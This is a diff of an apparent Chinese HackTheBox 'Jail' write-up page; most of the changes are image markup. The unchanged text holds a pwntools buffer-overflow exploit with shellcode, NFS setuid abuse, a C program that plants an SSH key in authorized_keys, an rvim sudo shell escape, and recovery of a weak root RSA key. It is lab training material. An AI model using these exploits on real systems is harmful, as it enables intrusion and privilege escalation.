@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;45  10.10.10.34   端口扫描需要全端口： 1234567891011121314➜  Jail nmap -p- 10.10.10.34Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-05-20 14:24 CSTNmap sca">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;45  10.10.10.34                                                                                                              端口扫描需要全端口： 12345678910">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jail - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/05/20/Jail-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;45  10.10.10.34   端口扫描需要全端口： 1234567891011121314➜  Jail nmap -p- 10.10.10.34Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-05-20 14:24 CSTNmap sca">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;45  10.10.10.34                                                                                                              端口扫描需要全端口： 12345678910">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052001.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052002.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052003.jpg">
@@ -134,7 +134,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -224,13 +224,27 @@
 </li>
 <li><h2 id="10-10-10-34"><a href="#10-10-10-34" class="headerlink" title="10.10.10.34"></a>10.10.10.34</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052001.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  Jail nmap -p- 10.10.10.34</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 14:24 CST</span><br><span class="line">Nmap scan report for 10.10.10.34</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">7411/tcp  open  daqstream</span><br><span class="line">20048/tcp open  mountd</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1624.97 seconds</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052002.jpg" alt=""></p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>nfs可以发现两个目录无限制：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> showmount -e 10.10.10.34</span></span><br><span class="line">Exports list on 10.10.10.34:</span><br><span class="line">/opt                                *</span><br><span class="line">/var/nfsshare                       *</span><br></pre></td></tr></table></figure>
 
@@ -238,8 +252,22 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.34/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50</span><br><span class="line"></span><br><span class="line">/jailuser             (Status: 301) [Size: 236] [--&gt; http://10.10.10.34/jailuser/]</span><br></pre></td></tr></table></figure>
 
 <p>里面是jail程序文件和源码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052003.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052004.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h1><p>这个就是7411端口的服务，根据源码和程序调试可以发现bof，源码里debug模式可以得到userpass buffer，就是基础的bof：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Leaked buffer address on remote</span><br><span class="line">userpass buffer addr 0xffffd610</span><br><span class="line">offset 28</span><br><span class="line"># 0xffffd610 + offset + 4 bytes of junk</span><br><span class="line">#buffer_offset &#x3D; 0xffffd610 + 32</span><br><span class="line">#buffer_offset &#x3D; hex(buffer_offset)</span><br><span class="line">#pint(buffer_offset)</span><br><span class="line">#Calculated buffer &#x3D; 0xffffd630</span><br></pre></td></tr></table></figure>
 
@@ -248,37 +276,109 @@
 <li><a href="https://www.exploit-db.com/exploits/34060" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34060</a></li>
 </ul>
 <p>打到nobody shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052005.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "A"*28 + p32(0xffffd630) + shellcode</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">28</span> + <span class="string">"\x30\xd6\xff\xff"</span> + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.10.10.34'</span>, <span class="number">7411</span>)</span><br><span class="line">print(r.recv(<span class="number">1024</span>))</span><br><span class="line">r.sendline(<span class="string">'USER admin'</span>)</span><br><span class="line">print(r.recv(<span class="number">1024</span>))</span><br><span class="line">r.sendline(<span class="string">'PASS '</span> + payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="frank-信息"><a href="#frank-信息" class="headerlink" title="frank  信息"></a>frank  信息</h2><p>当前nobody可以以frank身份运行/opt/logreader/logreader.sh，前面nfs看到有opt，所以下一步就是通过nfs打到frank：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052006.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h1><p>mount后的目录需要uid1000的用户才能访问，因为frank的uid是1000:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052007.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="nfsshare"><a href="#nfsshare" class="headerlink" title="nfsshare"></a>nfsshare</h2><p>实际用到的是nfsshare，用到的是nfs的配置错误导致suid继承，这样我们可以得到远程服务器上uid 1000的用户shell：</p>
 <ul>
 <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs 10.10.10.34:/var/nfsshare miao1 -o nolock</span><br><span class="line">gcc shell.c -o shell -m32</span><br><span class="line">cp ../shell .</span><br><span class="line">chmod 4777 shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052008.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shell-c"><a href="#shell-c" class="headerlink" title="shell.c"></a>shell.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc shell.c -o shell -m32</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setuid(<span class="number">1000</span>);</span><br><span class="line">FILE *fptr;</span><br><span class="line">fptr = fopen(<span class="string">"/home/frank/.ssh/authorized_keys"</span>, <span class="string">"a"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fptr, <span class="string">"ssh-rsa XXXXXX"</span>);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>suid程序执行后，写入公钥到frank用户，ssh登录，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052009.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="adm-信息"><a href="#adm-信息" class="headerlink" title="adm 信息"></a>adm 信息</h1><p>rvim：</p>
 <ul>
 <li><a href="https://gtfobins.github.io/gtfobins/rvim/#sudo" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/rvim/#sudo</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052010.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="frank-to-adm"><a href="#frank-to-adm" class="headerlink" title="frank to adm"></a>frank to adm</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入命令模式</span></span><br><span class="line">py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052011.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052011.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>发现一个加密的keys.rar和密码提示信息：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052012.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052012.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>另外更深层目录发现另一个提示信息：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052013.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052014.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052013.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052014.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据解出来的这句话搜到这篇文章：</p>
 <ul>
 <li><a href="https://www.bbc.com/news/world-us-canada-42826582" target="_blank" rel="noopener">https://www.bbc.com/news/world-us-canada-42826582</a></li>
@@ -298,9 +398,23 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/RsaCtfTool/RsaCtfTool.py --publickey ./rootauthorizedsshkey.pub --private</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052015.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052015.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>ssh使用私钥登录，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052016.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021052016.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://www.exploit-db.com/exploits/34060" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34060</a></li>
 <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a></li>
